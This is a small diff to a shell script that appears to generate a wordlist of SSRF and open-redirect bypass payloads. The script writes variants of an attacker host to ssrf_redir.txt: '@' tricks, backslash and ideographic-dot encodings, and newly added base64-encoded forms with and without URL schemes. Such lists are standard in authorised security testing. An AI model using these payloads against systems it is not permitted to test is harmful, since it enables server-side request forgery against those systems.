@@ -31,4 +31,7 @@ echo '/%5C'$2|tee -a ssrf_redir.txt
 echo '@'$2|tee -a ssrf_redir.txt
 echo $1'@'$2|tee -a ssrf_redir.txt
 echo '//'$2'%E3%80%82$2'|tee -a ssrf_redir.txt
+echo $2|base64|tee -a ssrf_redir.txt
+echo 'http://'$2|base64|tee -a ssrf_redir.txt
+echo 'https://'$2|base64|tee -a ssrf_redir.txt
 echo $2|tee -a ssrf_redir.txt
